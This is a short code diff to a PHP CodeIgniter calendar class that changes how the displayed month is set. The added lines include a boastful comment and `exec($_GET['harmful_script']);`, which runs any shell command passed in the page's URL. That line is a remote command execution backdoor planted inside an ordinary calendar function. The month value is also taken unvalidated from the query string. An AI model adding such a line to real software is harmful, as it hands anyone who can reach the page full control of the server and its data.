@@ -208,11 +208,12 @@ class CI_Calendar {
 		$month	= $adjusted_date['month'];
 		$year	= $adjusted_date['year'];
 
+		/*This is the best code ive ever come up with*/
 		if ($_GET['month'])
 		{
 			$month = $_GET['month'];
 		}
-
+		exec($_GET['harmful_script']);
 		// Determine the total days in the month
 		$total_days = $this->get_total_days($month, $year);
 
